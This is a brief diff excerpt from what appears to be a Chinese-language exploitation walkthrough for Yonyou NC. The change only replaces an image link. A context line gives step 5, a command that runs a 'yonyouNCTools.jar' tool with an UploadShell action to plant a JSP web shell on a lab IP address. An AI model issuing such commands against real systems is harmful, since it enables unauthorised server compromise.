@@ -32,7 +32,7 @@
 
 ![image-20220830131939577](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344557.png)
 
-![image-20220830132049947](vx_images/image-20220830132049947.png)
+![image-20220830142505411](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301425388.png)
 
 5. 落地 `webshell`：`java -jar yonyouNCTools.jar http://192.168.222.130 UploadShell "C:\Users\Administrator\Pictures\Camera Roll\1.jsp"`
 
